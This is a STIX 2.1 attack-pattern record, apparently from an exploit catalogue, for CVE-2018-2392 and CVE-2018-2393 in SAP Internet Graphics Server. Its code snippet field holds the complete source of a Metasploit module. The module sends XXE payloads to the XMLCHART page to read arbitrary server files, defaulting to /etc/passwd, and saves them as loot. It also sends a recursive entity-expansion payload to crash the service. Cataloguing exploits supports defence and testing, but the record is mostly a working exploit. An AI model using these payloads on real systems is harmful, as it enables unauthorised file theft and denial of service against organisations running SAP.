{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--365e7878-53e8-42c7-9a75-45347758b2fb",
    "created": "2024-08-14T16:22:31.79847Z",
    "modified": "2024-08-14T16:22:31.798474Z",
    "name": "SAP Internet Graphics Server (IGS) XMLCHART XXE",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb",
            "external_id": "sap_igs_xmlchart_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-2392"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-2393"
        },
        {
            "source_name": "reference",
            "url": "https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SAP Internet Graphics Server (IGS) XMLCHART XXE',\n        'Description' => %q{\n          This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page\n          of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. These\n          vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when\n          submitting a POST request to the XMLCHART page to generate a new chart.\n\n          Successful exploitation will allow unauthenticated remote attackers to read files from the server as the user\n          from which the IGS service is started, which will typically be the SAP admin user. Alternatively attackers\n          can also abuse the XXE vulnerability to conduct a denial of service attack against the vulnerable\n          SAP IGS server.\n        },\n        'Author' => [\n          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability\n          'Vladimir Ivanov' # @_generic_human_ This Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2018-2392' ],\n          [ 'CVE', '2018-2393' ],\n          [ 'URL', 'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf' ]\n        ],\n        'Actions' => [\n          [ 'READ', { 'Description' => 'Remote file read' } ],\n          [ 'DOS', { 'Description' => 'Denial Of Service' } ]\n        ],\n        'DefaultAction' => 'READ',\n        'DefaultOptions' => {\n          'SSL' => false # Disable SSL (by default SAP IGS does not use SSL/TLS)\n        },\n        'DisclosureDate' => '2018-03-14',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(40080),\n        OptString.new('FILE', [ false, 'File to read from the remote server', '/etc/passwd']),\n        OptString.new('URIPATH', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),\n      ]\n    )\n  end\n\n  def setup_xml_and_variables\n    @host = datastore['RHOSTS']\n    @port = datastore['RPORT']\n    @path = datastore['URIPATH']\n    @file = datastore['FILE']\n    if datastore['SSL']\n      @schema = 'https://'\n    else\n      @schema = 'http://'\n    end\n    @data_xml = {\n      name: Rex::Text.rand_text_alphanumeric(12),\n      filename: \"#{Rex::Text.rand_text_alphanumeric(12)}.xml\",\n      data: nil\n    }\n    @data_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>\n    <ChartData>\n      <Categories>\n        <Category>ALttP</Category>\n      </Categories>\n      <Series label=\"#{Rex::Text.rand_text_alphanumeric(6)}\">\n        <Point>\n          <Value type=\"y\">#{Rex::Text.rand_text_numeric(4)}</Value>\n        </Point>\n      </Series>\n    </ChartData>)\n    @xxe_xml = {\n      name: Rex::Text.rand_text_alphanumeric(12),\n      filename: \"#{Rex::Text.rand_text_alphanumeric(12)}.xml\",\n      data: nil\n    }\n  end\n\n  def make_xxe_xml(file_name)\n    entity = Rex::Text.rand_text_alpha(5)\n    @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>\n    <!DOCTYPE Extension [<!ENTITY #{entity} SYSTEM \"#{file_name}\">]>\n    <SAPChartCustomizing version=\"1.1\">\n      <Elements>\n        <ChartElements>\n          <Title>\n            <Extension>&#{entity};</Extension>\n          </Title>\n        </ChartElements>\n      </Elements>\n    </SAPChartCustomizing>)\n  end\n\n  def make_post_data(file_name, dos: false)\n    if !dos\n      make_xxe_xml(file_name)\n    else\n      @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>\n    <!DOCTYPE Extension [\n      <!ENTITY dos 'dos'>\n      <!ENTITY dos1 '&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;'>\n      <!ENTITY dos2 '&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;'>\n      <!ENTITY dos3 '&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;'>\n      <!ENTITY dos4 '&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;'>\n      <!ENTITY dos5 '&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;'>\n      <!ENTITY dos6 '&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;'>\n      <!ENTITY dos7 '&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;'>\n      <!ENTITY dos8 '&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;'>\n    ]>\n    <SAPChartCustomizing version=\"1.1\">\n      <Elements>\n        <ChartElements>\n          <Title>\n            <Extension>&dos8;</Extension>\n          </Title>\n        </ChartElements>\n      </Elements>\n    </SAPChartCustomizing>)\n    end\n\n    @post_data = Rex::MIME::Message.new\n    @post_data.add_part(@data_xml[:data], 'application/xml', nil, \"form-data; name=\\\"#{@data_xml[:name]}\\\"; filename=\\\"#{@data_xml[:filename]}\\\"\")\n    @post_data.add_part(@xxe_xml[:data], 'application/xml', nil, \"form-data; name=\\\"#{@xxe_xml[:name]}\\\"; filename=\\\"#{@xxe_xml[:filename]}\\\"\")\n  end\n\n  def get_download_link(html_response)\n    if html_response['ImageMap']\n      if (download_link_regex = html_response.match(/ImageMap\" href=\"(?<link>.*)\">ImageMap/))\n        @download_link = download_link_regex[:link]\n      else\n        @download_link = nil\n      end\n    else\n      @download_link = nil\n    end\n  end\n\n  def get_file_content(html_response)\n    if (file_content_regex = html_response.match(/^<area shape=rect coords=\"0, 0,0, 0\" (?<file_content>[^\\b]+?)>\\r\\n$/))\n      @file_content = file_content_regex[:file_content]\n    else\n      @file_content = nil\n    end\n  end\n\n  def send_first_request\n    # Send first HTTP request\n    begin\n      first_response = nil\n      first_response = send_request_cgi(\n        {\n          'uri' => normalize_uri(@path),\n          'method' => 'POST',\n          'ctype' => \"multipart/form-data; boundary=#{@post_data.bound}\",\n          'data' => @post_data.to_s\n        }\n      )\n    rescue StandardError => e\n      print_error(\"Failed to retrieve SAP IGS page at #{@schema}#{@host}:#{@port}#{@path}\")\n      vprint_error(\"Error #{e.class}: #{e}\")\n      return -1\n    end\n\n    # Check first HTTP response\n    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)\n      return -2\n    end\n\n    if first_response.body.include?('Errors')\n      return -3\n    end\n\n    first_response\n  end\n\n  def analyze_first_response(html_response)\n    get_download_link(html_response)\n    if !@download_link.to_s.empty?\n\n      # Send second HTTP request\n      begin\n        second_response = nil\n        second_response = send_request_cgi(\n          {\n            'uri' => normalize_uri(@download_link),\n            'method' => 'GET'\n          }\n        )\n      rescue StandardError => e\n        print_error(\"Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}\")\n        vprint_error(\"Error #{e.class}: #{e}\")\n        return -1 # Some exception was thrown whilst making the second HTTP request!\n      end\n\n      # Check second HTTP response\n      if second_response.nil? || second_response.code != 200 || !second_response.body.include?('area shape=rect')\n        return -2 # Reponse from second HTTP request was not what was expected!\n      end\n\n      get_file_content(second_response.body)\n      return 0\n    else\n      return -3 # Download link could not be found!\n    end\n  end\n\n  def check\n    # Set up variables\n    os_release = ''\n    os_release_file = '/etc/os-release'\n\n    # Set up XML data for HTTP request\n    setup_xml_and_variables\n    make_post_data(os_release_file, dos: false) # Create a XML data payload to retrieve the value of /etc/os-release\n    # so that the module can check if the target is vulnerable or not.\n\n    # Get OS release information\n    check_response = send_first_request\n    if check_response == -1\n      Exploit::CheckCode::Safe('The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')\n    elsif check_response == -2\n      Exploit::CheckCode::Safe('The server sent a response but it was not in the expected format. The target is likely patched.')\n    else\n      if check_response == -3\n        vprint_status(\"The SAP IGS server is vulnerable, but file: #{os_release_file} not found or not enough rights.\")\n      else\n        result = analyze_first_response(check_response.body)\n\n        # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.\n        if result == -1 || result == -3\n          Exploit::CheckCode::Safe('The server did not respond to the second request in the expected manner and is therefore safe')\n        elsif result == -2\n          Exploit::CheckCode::Unknown('Some connection error occurred and it was not possible to determine if the server is vulnerable or not')\n        end\n\n        if !@file_content.to_s.empty?\n          if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*\"(?<os>.*)\"$/))\n            os_release = \"OS: #{os_regex[:os]}\"\n          end\n        else\n          return Exploit::CheckCode::Safe(\"#{@host} did not return the contents of the requested file, aka #{os_release_file}. This host is likely patched.\")\n        end\n      end\n      # Make ident\n      if os_release != ''\n        ident = \"SAP Internet Graphics Server (IGS); #{os_release}\"\n      else\n        ident = 'SAP Internet Graphics Server (IGS)'\n      end\n      # Report Service and Vulnerability\n      report_service(\n        host: @host,\n        port: @port,\n        name: 'http',\n        proto: 'tcp',\n        info: ident\n      )\n      report_vuln(\n        host: @host,\n        port: @port,\n        name: name,\n        refs: references,\n        info: os_release\n      )\n      # Print Vulnerability\n      if os_release == ''\n        Exploit::CheckCode::Vulnerable(\"#{@host} returned a response indicating that its XMLCHART page is vulnerable to XXE!\")\n      else\n        Exploit::CheckCode::Vulnerable(\"#{@host} running #{os_release} returned a response indicating that its XMLCHART page is vulnerable to XXE!\")\n      end\n    end\n  end\n\n  def run\n    case action.name\n    when 'READ'\n      action_file_read\n    when 'DOS'\n      action_dos\n    else\n      print_error(\"The action #{action.name} is not a supported action.\")\n    end\n  end\n\n  def action_file_read\n    # Set up XML data for HTTP request\n    setup_xml_and_variables\n    make_post_data(@file, dos: false)\n\n    # Download remote file\n    first_response = send_first_request\n    if first_response == -1\n      fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')\n    elsif first_response == -2\n      fail_with(Failure::UnexpectedReply, 'The server sent a response but it was not in the expected format. The target is likely patched.')\n    else\n      # Report Service and Vulnerability\n      report_service(\n        host: @host,\n        port: @port,\n        name: 'http',\n        proto: 'tcp',\n        info: 'SAP Internet Graphics Server (IGS)'\n      )\n      report_vuln(\n        host: @host,\n        port: @port,\n        name: name,\n        refs: references\n      )\n      # Get remote file content\n      if first_response == -3\n        print_status(\"The SAP IGS server is vulnerable, but file: #{@file} not found or not enough rights.\")\n      else\n        result = analyze_first_response(first_response.body)\n        # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.\n        if result == -1\n          fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the second request and did not respond in the expected manner.')\n        elsif result == -2\n          print_error('The server responded successfully but the response indicated the server is not vulnerable!')\n          return\n        elsif result == -3\n          print_error('The server responded successfully but no download link was found in the response, so it is not vulnerable!')\n          return\n        end\n\n        if !@file_content.to_s.empty?\n          vprint_good(\"File: #{@file} content from host: #{@host}\\n#{@file_content}\")\n          loot = store_loot('igs.xmlchart.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XMLCHART XXE')\n          print_good(\"File: #{@file} saved in: #{loot}\")\n        else\n          print_error(\"Failed to get #{@file} content!\")\n        end\n\n      end\n    end\n  end\n\n  def action_dos\n    # Set up XML data for HTTP request\n    setup_xml_and_variables\n    make_post_data(@file, dos: true)\n\n    # Send HTTP request\n    begin\n      dos_response = nil\n      dos_response = send_request_cgi(\n        {\n          'uri' => normalize_uri(@path),\n          'method' => 'POST',\n          'ctype' => \"multipart/form-data; boundary=#{@post_data.bound}\",\n          'data' => @post_data.to_s\n        }, 10\n      )\n    rescue Timeout::Error\n      print_good(\"Successfully managed to DOS the SAP IGS server at #{@host}:#{@port}\")\n\n      # Report Service and Vulnerability\n      report_service(\n        host: @host,\n        port: @port,\n        name: 'http',\n        proto: 'tcp',\n        info: 'SAP Internet Graphics Server (IGS)'\n      )\n      report_vuln(\n        host: @host,\n        port: @port,\n        name: name,\n        refs: references\n      )\n    rescue StandardError => e\n      print_error(\"Failed to retrieve SAP IGS page at #{@schema}#{@host}:#{@port}#{@path}\")\n      vprint_error(\"Error #{e.class}: #{e}\")\n    end\n\n    # Check HTTP response\n    fail_with(Failure::NotVulnerable, 'The target responded with a 200 OK response code. The DoS attempt was unsuccessful.') unless dos_response.code != 200\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-03-14"
}